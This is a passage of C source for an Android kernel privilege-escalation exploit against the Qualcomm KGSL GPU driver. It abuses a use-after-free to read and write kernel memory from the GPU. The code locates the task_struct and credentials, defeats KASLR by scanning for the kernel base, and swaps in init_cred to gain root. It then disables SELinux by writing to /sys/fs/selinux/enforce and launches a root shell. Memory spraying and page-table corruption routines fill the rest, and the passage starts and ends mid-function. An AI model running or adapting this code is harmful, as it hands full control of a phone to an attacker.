            gpu_read_task_struct(child_fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&real_cred_ptr, 8);
        }

        // If still no cred, scan full task page for cred pair (same as parent fallback)
        if (task_va != 0 && cred_ptr == 0) {
            fprintf(stderr, "[CHILD %d] Self-scanning task page for cred...\n", getpid());
            uint64_t page_base = task_va & ~0xFFFULL;
            uint8_t page[PAGE_SIZE];
            if (gpu_read_task_struct(child_fd, page_base, page, PAGE_SIZE) == 0) {
                for (int off = 0; off < PAGE_SIZE - 16; off += 8) {
                    uint64_t v1 = *(uint64_t *)(page + off);
                    uint64_t v2 = *(uint64_t *)(page + off + 8);
                    if (((v1 >> 48) == 0xffff) && ((v2 >> 48) == 0xffff) && (v1 != v2)) {
                        uint32_t usage = 0, uid = 0;
                        if (gpu_read_task_struct(child_fd, v1, (uint8_t *)&usage, 4) == 0 && usage > 0 && usage < 100) {
                            gpu_read_task_struct(child_fd, v1 + 4, (uint8_t *)&uid, 4);
                            if (uid == 10237) {
                                fprintf(stderr, "[CHILD %d] Self-found cred at +0x%x: 0x%lx (uid=%u)\n",
                                        getpid(), off, (unsigned long)v1, uid);
                                cred_ptr = v1;
                                real_cred_ptr = v2;
                                break;
                            }
                        }
                    }
                }
            }
        }

        fprintf(stderr, "[CHILD %d] Fallback cred_ptr=0x%lx real_cred=0x%lx\n",
                getpid(), (unsigned long)cred_ptr, (unsigned long)real_cred_ptr);

        if (cred_ptr != 0) {
            patch_cred_via_gpu(child_fd, cred_ptr, real_cred_ptr);
        }

        // Try to write init_cred pointer directly into task+0x770
        // (atomic cred swap — kernel will use this cred for new operations)
        if (task_va != 0) {
            // Hardcoded init_cred from v6 log: 0xffffffc0018f9038
            uint64_t init_cred_va = 0xffffffc0018f9038ULL;
            fprintf(stderr, "[CHILD %d] Trying atomic cred swap: task+0x%x <- 0x%lx\n",
                    getpid(), OFFSET_CRED, (unsigned long)init_cred_va);
            gpu_write_task_virt(child_fd, task_va + OFFSET_CRED, (uint8_t *)&init_cred_va, 8);
            gpu_write_task_virt(child_fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&init_cred_va, 8);

            // Also try alternate cred offsets
            const uint64_t alt_offsets[] = {0x848, 0x850, 0x870, 0x878};
            for (int i = 0; i < 4; i++) {
                gpu_write_task_virt(child_fd, task_va + alt_offsets[i], (uint8_t *)&init_cred_va, 8);
            }
        }

        setuid(0);
        close(child_fd);
    }

    if (getuid() == 0) {
        fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS via fallback!\n", getpid());
        fflush(stderr);
    } else {
        // Last resort: try setresuid(0) directly (works if we have CAP_SETUID)
        fprintf(stderr, "[CHILD %d] Trying setresuid(0,0,0) as last resort...\n", getpid());
        fflush(stderr);
        if (setresuid(0, 0, 0) == 0 && getuid() == 0) {
            fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS via setresuid!\n", getpid());
        } else if (setresgid(0, 0, 0) == 0 && setresuid(0, 0, 0) == 0 && getuid() == 0) {
            fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS via setresuid+setresgid!\n", getpid());
        } else {
            fprintf(stderr, "[CHILD %d] [!] Elevation FAILED. Still UID %d\n", getpid(), getuid());
            fflush(stderr);
            gbuf[GBUF_TASK_SPRAY] = 0x1;
            return;
        }
    }

shell:
    // IMPORTANT: Do NOT call setresuid here. We already have uid=0 in kernel.
    // Calling setresuid in untrusted_app context with init_cred can trigger
    // SELinux denials (init->untrusted_app reverse transition) and SIGSEGV.
    // The cred patch already gave us root, just exec the shell directly.

    gbuf[GBUF_TASK_SPRAY] = 0x2; // Signal parent FIRST so parent doesn't wait
    __sync_synchronize();

    // Robust verification: Try to read /data/system/packages.list (Root only)
    int test_fd = open("/data/system/packages.list", O_RDONLY);
    if (test_fd >= 0) {
        fprintf(stderr, "[CHILD %d] [+++] ROOT VERIFIED: Successfully opened protected system file!\n", getpid());
        close(test_fd);
    } else {
        fprintf(stderr, "[CHILD %d] [!] ROOT WARNING: Could not open protected file (errno=%d). SELinux might be active.\n", getpid(), errno);
    }

    fprintf(stderr, "[CHILD %d] [+] Executing root shell...\n", getpid());
    fprintf(stderr, "[CHILD %d] Verified identity: UID=%d GID=%d\n", getpid(), getuid(), getgid());
    fflush(stderr);

    // Set environment for root
    setenv("PATH", "/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin:/data/local/tmp:/data/user/0/com.termux/files/usr/bin", 1);
    setenv("TERM", "xterm", 1);
    setenv("HOME", "/data/local/tmp", 1);

    // CRITICAL: Termux-compiled binaries require libtermux-exec-ld-preload.so
    // Without LD_PRELOAD, any binary we exec will fail with "library not found"
    if (access("/data/data/com.termux/files/usr/lib/libtermux-exec-ld-preload.so", R_OK) == 0) {
        setenv("LD_PRELOAD", "/data/data/com.termux/files/usr/lib/libtermux-exec-ld-preload.so", 1);
        fprintf(stderr, "[CHILD %d] Set LD_PRELOAD for Termux compat\n", getpid());
    } else if (access("/data/data/com.termux/files/usr/lib/libtermux-exec-ld-preload.so", F_OK) == 0) {
        // exists but not readable - try anyway
        setenv("LD_PRELOAD", "/data/data/com.termux/files/usr/lib/libtermux-exec-ld-preload.so", 1);
    }
    // Also try system paths as fallback
    char *ld_paths[] = {
        "/data/data/com.termux/files/usr/lib/libtermux-exec-ld-preload.so",
        "/system/lib64/libtermux-exec-ld-preload.so",
        NULL
    };
    for (int i = 0; ld_paths[i]; i++) {
        if (access(ld_paths[i], R_OK) == 0) {
            setenv("LD_PRELOAD", ld_paths[i], 1);
            break;
        }
    }

    // Try to disable SELinux BEFORE exec (so the new shell inherits permissive context)
    if (getuid() == 0) {
        // We are root, try to disable SELinux
        FILE *f = fopen("/sys/fs/selinux/enforce", "w");
        if (f) { fputs("0\n", f); fclose(f); }
    }

    // Use execve directly with proper argv (no -i which can fail in some shells)
    // Also redirect stdin/stdout/stderr to /dev/tty if available
    int tty_fd = open("/dev/tty", O_RDWR);
    if (tty_fd >= 0) {
        dup2(tty_fd, 0);
        dup2(tty_fd, 1);
        dup2(tty_fd, 2);
        if (tty_fd > 2) close(tty_fd);
    }

    // Try multiple shell paths in order of preference
    // For Termux, use the bundled shell (which has LD_PRELOAD compatibility)
    // For system, use /system/bin/sh
    char *sh_paths[] = {
        "/data/data/com.termux/files/usr/bin/sh",  // Termux bash/sh
        "/data/data/com.termux/files/usr/bin/bash",
        "/system/bin/sh",                          // Android sh
        "/vendor/bin/sh",
        "/system/bin/toybox",
        NULL
    };
    for (int i = 0; sh_paths[i]; i++) {
        if (access(sh_paths[i], X_OK) == 0) {
            fprintf(stderr, "[CHILD %d] Trying shell: %s\n", getpid(), sh_paths[i]);
            fflush(stderr);
            execl(sh_paths[i], "sh", NULL);
            // If execl returns, it failed - try next
        }
    }
    // Last resort
    fprintf(stderr, "[CHILD %d] All shells failed, trying system call\n", getpid());
    fflush(stderr);
    execl("/system/bin/sh", "sh", NULL);
    exit(0);
}



static uint64_t find_kernel_base_from_task_struct(uint8_t *task_data, size_t data_size)
{
    uint64_t possible_base = 0;
    for (int off = 0; off + 8 <= (int)data_size; off += 8)
    {
        uint64_t ptr = *(uint64_t *)(task_data + off);
        if (ptr == 0 || ptr == 0xffffffffffffffffULL)
            continue;
        if ((ptr & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
            continue;

        uint64_t candidates[] = {
            ptr & 0xFFFFFFFFFF000000ULL,
            ptr & 0xFFFFFFFFFE000000ULL,
            ptr & 0xFFFFFFFFFC000000ULL,
            ptr & 0xFFFFFFFFF8000000ULL,
            ptr & 0xFFFFFFFFF0000000ULL,
            ptr & 0xFFFFFFFFE0000000ULL,
            ptr & 0xFFFFFFFFC0000000ULL,
            ptr & 0xFFFFFFFF80000000ULL,
            ptr & 0xFFFFFFFF00000000ULL,
        };

        for (int c = 0; c < 9; c++)
        {
            uint64_t test_base = candidates[c];
            if (test_base == 0)
                continue;
            if ((test_base & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
                continue;

            uint8_t elf_magic[4];
            if (gpu_read_task_struct(fd, test_base, elf_magic, 4) == 0)
            {
                if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F')
                {
                    fprintf(stderr, "[KBASE] Found ELF magic at 0x%lx via ptr 0x%lx\n",
                            (unsigned long)test_base, (unsigned long)ptr);
                    return test_base;
                }
            }
        }
        uint64_t bases_to_try[] = {
            possible_base,
            possible_base - 0x100000000ULL,
            possible_base + 0x100000000ULL,
            ptr & 0xFFFFFFFFC0000000ULL,
            (ptr & 0xFFFFFFFFC0000000ULL) - 0x100000000ULL,
            (ptr & 0xFFFFFFFFC0000000ULL) + 0x100000000ULL,
        };

        for (int b = 0; b < sizeof(bases_to_try) / sizeof(bases_to_try[0]); b++)
        {
            uint64_t test_base = bases_to_try[b];
            if (test_base == 0)
                continue;
            if ((test_base & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
                continue;
            if (test_base > 0xffffffff00000000ULL) // Too high for SD888
                continue;

            uint8_t test_data[8] = {0};
            if (gpu_read_task_struct(fd, test_base, test_data, sizeof(test_data)) != 0)
                continue;

            uint32_t first_word = *(uint32_t *)test_data;
            if (first_word != 0 && first_word != 0xFFFFFFFF)
            {
                fprintf(stderr, "[KBASE] Candidate 0x%lx from ptr 0x%lx at off 0x%x (first_word=0x%08x)\n",
                        (unsigned long)test_base, (unsigned long)ptr, off, first_word);
                return test_base;
            }
        }
    }

    fprintf(stderr, "[KERNEL_BASE] Could not find kernel base from task data\n");
    return 0;
}

static uint64_t find_kernel_base_from_task_va(uint64_t task_va)
{
    uint8_t task_data[4096];
    if (gpu_read_task_struct(fd, task_va, task_data, sizeof(task_data)) != 0) return 0;

    fprintf(stderr, "[KBASE] Scanning task_struct at 0x%lx for kernel pointers...\n", (unsigned long)task_va);

    // Search for a kernel pointer in task_struct
    for (int off = 0; off < 4096 - 8; off += 8) {
        uint64_t ptr = *(uint64_t *)(task_data + off);
        
        // Broad range for AArch64 kernel pointers (0xffffff00... to 0xffffffff...)
        if ((ptr >> 48) == 0xffff) { 
            // Scan backwards from ptr in 2MB steps for ELF magic
            uint64_t start = ptr & ~0x1fffffULL;
            for (int i = 0; i < 1024; i++) { // Search up to 2GB backwards
                uint64_t test_va = start - (i * 0x200000ULL);
                uint32_t magic = 0;
                if (gpu_read_task_struct(fd, test_va, (uint8_t *)&magic, 4) == 0) {
                    if (magic == 0x464c457f) { // \x7fELF
                        fprintf(stderr, "[KBASE] Found ELF at 0x%lx (from ptr 0x%lx at task+0x%x)\n", (unsigned long)test_va, (unsigned long)ptr, off);
                        return test_va;
                    }
                }
            }
        }
    }
    return 0;
}

static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int data_size, int comm_off,
                                       uint64_t *out_cred_ptr, uint64_t *out_real_cred_ptr)
{
    uid_t my_uid = getuid();
    fprintf(stderr, "[OFFSET] Dynamic scan for CRED pointers (UID: %u)...\n", my_uid);
    
    // Scan range around comm_off (usually cred is within +/- 512 bytes)
    int scan_start = (comm_off > 512) ? comm_off - 512 : 0;
    int scan_end = (comm_off + 512 < data_size) ? comm_off + 512 : data_size - 8;

    for (int off = scan_start; off < scan_end; off += 8) {
        uint64_t ptr = *(uint64_t *)(task_data + off);
        // Broad range for kernel pointers
        if ((ptr >> 48) == 0xffff) { 
            uint8_t cred_page[256];
            if (gpu_read_task_struct(fd, ptr, cred_page, 256) == 0) {
                // Scan for our UID in the pointed-to memory
                for (int c_off = 0; c_off < 128; c_off += 4) {
                    uint32_t val = *(uint32_t *)(cred_page + c_off);
                    if (val == my_uid) {
                        uint32_t next1 = *(uint32_t *)(cred_page + c_off + 4);
                        if (next1 == my_uid) {
                            fprintf(stderr, "[OFFSET] Found CRED candidate at offset 0x%x -> 0x%lx (UID match at cred+0x%x)\n", 
                                    off, (unsigned long)ptr, c_off);
                            *out_cred_ptr = ptr;
                            // Check if there's a real_cred nearby
                            if (off >= 8) *out_real_cred_ptr = *(uint64_t *)(task_data + off - 8);
                            if (*out_real_cred_ptr == 0 && off + 8 < scan_end) *out_real_cred_ptr = *(uint64_t *)(task_data + off + 8);
                            return 0;
                        }
                    }
                }
            }
        }
    }
    return -1;
}

static uint64_t find_kernel_base_auto(void)
{
    uint64_t base = 0;

    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
    if (task_va)
    {
        base = find_kernel_base_from_task_va(task_va);
        if (base) {
            fprintf(stderr, "[KBASE] Dynamic discovery SUCCESS: 0x%lx\n", (unsigned long)base);
            return base;
        }
    }

    uint64_t standard_bases[] = {
        0xffffffa000000000ULL, // Observed in your latest logs (a3...)
        0xffffffaf20000000ULL, 
        0xffffffaf00000000ULL,
        0xffffffb000000000ULL,
        0xffffffc000000000ULL,
        0xffffffc010000000ULL, 
        0xffffffc008200000ULL,
        0xffffff9550000000ULL, 
        0xffffff94d0000000ULL, 
        0xffffff8e70000000ULL, 
    };

    for (int i = 0; i < 10; i++)
    {
        uint8_t elf_magic[4];
        if (gpu_read_task_struct(fd, standard_bases[i], elf_magic, 4) == 0)
        {
            if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
                fprintf(stderr, "[KBASE] Standard base MATCH: 0x%lx\n", (unsigned long)standard_bases[i]);
                return standard_bases[i];
            }
        }
    }

    // Aggressive scan in a wide range for Android 13 KASLR
    fprintf(stderr, "[KBASE] Starting aggressive range scan for ELF magic...\n");
    for (uint64_t test = 0xffffff8000000000ULL; test < 0xffffffdf00000000ULL; test += 0x200000ULL) {
        uint8_t elf_magic[4];
        if (gpu_read_task_struct(fd, test, elf_magic, 4) == 0) {
            if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
                fprintf(stderr, "[KBASE] Aggressive scan FOUND ELF: 0x%lx\n", (unsigned long)test);
                return test;
            }
        }
    }

    fprintf(stderr, "[KBASE] [!] FAILED to find kernel base automatically!\n");
    return 0;
}

static uint64_t find_offsets_auto(uint64_t kernel_base)
{
    uint64_t selinux_offsets[] = {
        SELINUX_OFFSET,
        0x2A8FCE8, 0x2B8FCE8, 0x2D8FCE8, 0x2E8FCE8, 0x2C8FCE8, 0x2F4FCE8, 0x2F5FCE8,
        0x2F84CE8, 0x2F64CE8, 0x2F54CE8, 0x2F44CE8, 0x2F34CE8, 0x2F24CE8, 0x2F14CE8,
        0x2F04CE8, 0x2EF4CE8, 0x3000000, 0x3100000, 0x3200000, 0x3F74CE8, 0x3F84CE8,
        0x2f74ce8, 0x2f74ce0, 0x2f74cf0, 0x2f74d00, 0x2f74d10, 0x2f74d20, 0x2f74d30,
        0x2f74d40, 0x2f74d50, 0x2f74d60, 0x2f74d70, 0x2f74d80, 0x2f74d90, 0x2f74da0,
        0x2f74db0, 0x2f74dc0, 0x2f74dd0, 0x2f74de0, 0x2f74df0, 0x2f74e00,
        0x24C2538, // memstart_addr candidate
        0x2bb8ec0  // poweroff_cmd candidate
    };

    for (size_t i = 0; i < sizeof(selinux_offsets) / sizeof(selinux_offsets[0]); i++)
    {
        uint64_t test_addr = kernel_base + selinux_offsets[i];
        uint8_t test_data[8];
        if (gpu_read_task_struct(fd, test_addr, test_data, 8) == 0)
        {
            uint64_t val = *(uint64_t *)test_data;
            uint32_t val32 = (uint32_t)(val & 0xFFFFFFFF);
            uint32_t hi32 = (uint32_t)(val >> 32);
            if ((val32 == 0 || val32 == 1) && hi32 == 0)
            {
                fprintf(stderr, "[SELINUX] Found offset 0x%lx at addr 0x%lx val=0x%lx\n",
                        (unsigned long)selinux_offsets[i], (unsigned long)test_addr, (unsigned long)val);
                return selinux_offsets[i];
            }
        }
    }

    return 0;
}

static uint64_t get_kernel_base(void)
{
    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
    uint64_t base = 0;

    if (task_va != 0)
    {
        base = find_kernel_base_from_task_va(task_va);
        if (base != 0)
            return base;
    }

    base = find_kernel_base_auto();
    if (base != 0)
    {
        kernel_base = base;
        return kernel_base;
    }

    uint64_t bases[] = {
        0xffffffc000000000ULL,
        0xffffffc010000000ULL,
        0xffffffc020000000ULL,
        0xffffffc030000000ULL,
        0xffffffc035000000ULL,
        0xffffffc040000000ULL,
    };

    for (int i = 0; i < sizeof(bases) / sizeof(bases[0]); i++)
    {
        uint64_t test_base = bases[i];
        uint64_t test_selinux = test_base + SELINUX_OFFSET;
        uint8_t test_data[8];
        if (gpu_read_task_struct(fd, test_selinux, test_data, 8) == 0)
        {
            uint64_t val = *(uint64_t *)test_data;
            if (val == 0 || val == 1)
            {
                kernel_base = test_base;
                selinux_enforcing = test_selinux;
                return kernel_base;
            }
        }
    }
    return 0;
}

static int find_marker_in_page(uint8_t *page_data, size_t page_size, uint64_t current_va, pid_t *out_pid)
{
    const char *marker = MARKER_NAME;
    size_t marker_len = 8;

    for (int off = 0; off < (int)page_size - (int)marker_len - 5; off++)
    {
        if (memcmp(page_data + off, marker, marker_len) == 0)
        {
            char pid_str[6] = {0};
            memcpy(pid_str, page_data + off + marker_len, 5);

            int is_digit = 1;
            for (int i = 0; i < 5; i++)
            {
                if (pid_str[i] < '0' || pid_str[i] > '9')
                {
                    is_digit = 0;
                    break;
                }
            }

            if (is_digit)
            {
                pid_t pid = atoi(pid_str);
                if (pid > 1000 && pid < 100000)
                {
                    *out_pid = pid;
                    fprintf(stderr, "[MARKER] Found at VA 0x%lx offset 0x%03x: PID=%d\n",
                            (unsigned long)current_va, off, pid);
                    return 1;
                }
            }
        }
    }
    return 0;
}

static void hex_dump_internal(const char *desc, uint64_t addr, uint8_t *data, size_t size) {
    fprintf(stderr, "--- %s at 0x%lx ---\n", desc, (unsigned long)addr);
    for (size_t i = 0; i < size; i += 16) {
        fprintf(stderr, "%04x: ", (unsigned int)i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) fprintf(stderr, "%02x ", data[i + j]);
            else fprintf(stderr, "   ");
        }
        fprintf(stderr, " | ");
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) {
                uint8_t c = data[i + j];
                fprintf(stderr, "%c", (c >= 0x20 && c <= 0x7e) ? c : '.');
            }
        }
        fprintf(stderr, "\n");
    }
    fprintf(stderr, "---------------------------------\n");
}

static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
{
    unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int marker_found = 0;

    fprintf(stderr, "\n[12] SCANNING UAF (Window %d)\n", batch_idx);

    struct kgsl_drawctxt_create ctx = {.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) return 0;
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {.size = PAGE_SIZE * 8, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) goto cleanup;
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)ib_id) << 12);

    struct kgsl_gpuobj_alloc dst_alloc = {.size = PAGE_SIZE, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) goto cleanup;
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)dst_id) << 12);

    struct kgsl_gpuobj_info info = {.id = ib_id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;
    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    // Сдвигаем окно сканирования в зависимости от номера батча
    uint64_t scan_offset = (batch_idx * 0x400000ULL) % UAF_SIZE; // Уменьшили шаг для более тщательного поиска
    uint64_t current_va = UAF_START + scan_offset;
    uint64_t end_va = UAF_START + UAF_SIZE;
    
    fprintf(stderr, "      Current Scan Offset: 0x%lx (VA 0x%lx)\n", 
            (unsigned long)scan_offset, (unsigned long)current_va);
    
    int total_pages_scanned = 0;
    int max_pages_to_scan = 2048; // Снижено с 4096 для стабильности

    while (total_pages_scanned < max_pages_to_scan && !marker_found)
    {
        if (current_va >= end_va) current_va = UAF_START;

        double current_ram = get_ram_usage_percentage();
        if (current_ram > 70.0) { // Throttling at 70% RAM
            fprintf(stderr, "\n[!] SCAN THROTTLING: RAM at %.1f%%. Cooling down...\n", current_ram);
            usleep(2000000); 
            continue; 
        }

        uint32_t *cmd = (uint32_t *)ib_vma;
        memset(ib_vma, 0, ib_alloc.mmapsize);
        int dw = 0;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
        for (int i = 0; i < 1024; i++) {
            uint32_t d_lo, d_hi, s_lo, s_hi;
            split64(dst_gpu + i * 4, &d_lo, &d_hi);
            split64(current_va + i * 4, &s_lo, &s_hi);
            cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0;
            cmd[dw++] = d_lo;
            cmd[dw++] = d_hi;
            cmd[dw++] = s_lo;
            cmd[dw++] = s_hi;
        }
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        struct kgsl_command_object obj = {.gpuaddr = ib_gpu, .size = (size_t)dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_id};
        struct kgsl_gpu_command gpu_cmd = {.cmdlist = (uintptr_t)&obj, .cmdsize = sizeof(obj), .numcmds = 1, .context_id = ctx_id};

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 && wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
        {
            msync(dst_vma, PAGE_SIZE, MS_SYNC | MS_INVALIDATE);
            pid_t found_pid = 0;
            int off = 0;
            if (find_marker_in_page((uint8_t *)dst_vma, PAGE_SIZE, current_va, &found_pid))
            {
                // Find the exact offset for logging
                for (int i = 0; i < 4096 - 8; i++) {
                    if (memcmp((uint8_t *)dst_vma + i, MARKER_NAME, 8) == 0) {
                        off = i;
                        break;
                    }
                }

                uint64_t task_start_va = current_va + off - OFFSET_COMM;
                uid_t my_uid = getuid();
                uint64_t found_cred_ptr = 0;
                uint64_t found_real_cred_ptr = 0;

                fprintf(stderr, "\n    [?] POTENTIAL TASK FOUND at VA 0x%lx, offset 0x%x, PID=%d\n", (unsigned long)task_start_va, off, found_pid);

                // ROG 5S Optimized: Dynamic scan for CRED pointers
                if (find_cred_pointers_near_comm(fd, task_start_va, (uint8_t *)dst_vma, PAGE_SIZE, off, &found_cred_ptr, &found_real_cred_ptr) == 0) {
                    fprintf(stderr, "    [+++] DYNAMIC CRED FOUND: 0x%lx (Real: 0x%lx)\n", (unsigned long)found_cred_ptr, (unsigned long)found_real_cred_ptr);
                } else {
                    // Fallback to static offset
                    fprintf(stderr, "    [*] Dynamic scan failed. Using verified task_struct offsets (cred at 0x%x, real_cred at 0x%x)...\n", OFFSET_CRED, OFFSET_REAL_CRED);
                    gpu_read_task_struct(fd, task_start_va + OFFSET_CRED, (uint8_t *)&found_cred_ptr, 8);
                    gpu_read_task_struct(fd, task_start_va + OFFSET_REAL_CRED, (uint8_t *)&found_real_cred_ptr, 8);
                }

                if (found_cred_ptr != 0) {
                    uint32_t cred_check[3]; // usage, uid, gid
                    if (gpu_read_task_struct(fd, found_cred_ptr, (uint8_t *)cred_check, 12) == 0) {
                        if (cred_check[0] > 0) {
                            fprintf(stderr, "    [+++] VERIFIED CRED FOUND: 0x%lx (UID %u, GID %u, usage %u)\n", 
                                    (unsigned long)found_cred_ptr, cred_check[1], cred_check[2], cred_check[0]);
                        } else {
                            fprintf(stderr, "    [!] Warning: Found CRED at 0x%lx has usage 0. This is likely a false positive.\n", 
                                    (unsigned long)found_cred_ptr);
                        }
                    }
                }

                // RECORD TARGET INFO AND EXIT SCAN (Cleanup will happen in main)
                fprintf(stderr, "\n    [!] TARGET LOCATED (PID %d). Preparing for cleanup and patch...\n", found_pid);
                
                marker_found = 1;
                *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
                *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = found_cred_ptr;
                *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR] = found_real_cred_ptr;
                break;
            }
        }

        current_va += PAGE_SIZE * 8; // Увеличили шаг до 8 для скорости
        total_pages_scanned++;
        if (total_pages_scanned % 256 == 0) { 
            fprintf(stderr, "."); fflush(stderr); 
            usleep(200000); 
        }
        usleep(5000); // Минимальная пауза между страницами увеличена
    }

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED) munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma && ib_vma != MAP_FAILED) munmap(ib_vma, ib_alloc.mmapsize);
    if (dst_id) { struct kgsl_gpuobj_free fr = {.id = dst_id}; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    if (ib_id) { struct kgsl_gpuobj_free fr = {.id = ib_id}; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    if (ctx_id) { struct kgsl_drawctxt_destroy dctx = {.drawctxt_id = ctx_id}; ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx); }
    return marker_found;
}

static int mmap_spray_done;
static void mmap_spray(void)
{
    fprintf(stderr, "\n[13] mmap-spraying user VA space\n");
    mmap_spray_done = 0;
    for (int i = 0; i < MMAP_SPRAY_COUNT; i++)
    {
        uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        void *p;
        for (int j = 0; j < 5; j++)
        {
            p = mmap(addr + PAGE_SIZE * (uint64_t)sig_num[j], PAGE_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                     -1, 0);
            *(volatile uint8_t *)p = sig_num[j];
            if ((uint64_t)p != (uint64_t)addr + PAGE_SIZE * (uint64_t)sig_num[j])
            {
                fprintf(stderr, "[13] mmap_spray: failed at %p\n", p);
                break;
            }
        }
        mmap_spray_done++;
        if (i % 1000 == 0)
        {
            fprintf(stderr, "[13] Progress: %d/%d\n", i, MMAP_SPRAY_COUNT);
        }
    }
    fprintf(stderr, "[13] mmap-spray complete: %d pages\n", MMAP_SPRAY_COUNT);
}

static void mmap_spray_free(void)
{
    fprintf(stderr, "[CLEANUP] Freeing mmap spray...\n");
    for (int i = 0; i < MMAP_SPRAY_COUNT; i++)
    {
        uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        for (int j = 0; j < 5; j++)
        {
            munmap(addr + PAGE_SIZE * (uint64_t)sig_num[j], 0x1000);
        }
    }
    fprintf(stderr, "[CLEANUP] mmap spray freed\n");
}

static void mmap_check(void)
{
    uint64_t *check_addr = (uint64_t *)&gbuf[GBUF_MMAP_CHECK];
    int cnt = 0;
    uint32_t *corrupt_cnt = (uint32_t *)(gbuf + GBUF_MMAP_CORRUPT);
    fprintf(stderr, "\n[14] mmap-checking user VA space\n");
    *corrupt_cnt = 0;

    for (int i = 0; i < MMAP_SPRAY_COUNT; i++)
    {
        uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        uint8_t *pp = addr + PAGE_SIZE * (uint64_t)sig_num[0];
        if (*(volatile uint8_t *)pp != sig_num[0])
        {
            fprintf(stderr, "[14] PFN corrupted at 0x%lx!\n", (unsigned long)addr);
            gb_target_addr = (uint64_t)addr;

            for (int k = 0; k < 10; k += 2)
            {
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                void *filled = mmap(hole_addr, PAGE_SIZE,
                                    PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                                    -1, 0);
                if (filled != MAP_FAILED)
                {
                    *(volatile uint8_t *)filled = 0xCC;
                }
            }
            for (int k = 10; k < 16; k += 1)
            {
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                void *filled = mmap(hole_addr, PAGE_SIZE,
                                    PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                                    -1, 0);
                if (filled != MAP_FAILED)
                {
                    *(volatile uint8_t *)filled = 0xCC;
                }
            }

            void *base = (void *)(addr + 0x10 * PAGE_SIZE);
            size_t len = 0x3e000;
            void *lib = mmap(base, len,
                             PROT_READ | PROT_EXEC,
                             MAP_PRIVATE | MAP_FIXED | MAP_POPULATE,
                             fd_lib, 0);

            if (lib == MAP_FAILED)
            {
                fprintf(stderr, "[14] mmap libbase error\n");
                perror("mmap libbase");
                exit(1);
            }
            else
            {
                fprintf(stderr, "[14] success mmap libbase : va: %p\n", lib);
                volatile uint8_t *p = (volatile uint8_t *)lib;
                for (size_t off = 0; off < 0x3e000; off += PAGE_SIZE)
                {
                    volatile uint8_t dummy = p[off];
                    (void)dummy;
                }
                *(uint64_t *)&gbuf[GBUF_LIB_BASE] = (uint64_t)lib;
            }
        }
    }
    fprintf(stderr, "[14] mmap-check complete\n");
}

static void recover_origin(int fd)
{
    uint64_t patched_va[64] = {0};
    uint64_t saved_pte0[64] = {0};
    size_t patched_cnt = 0;
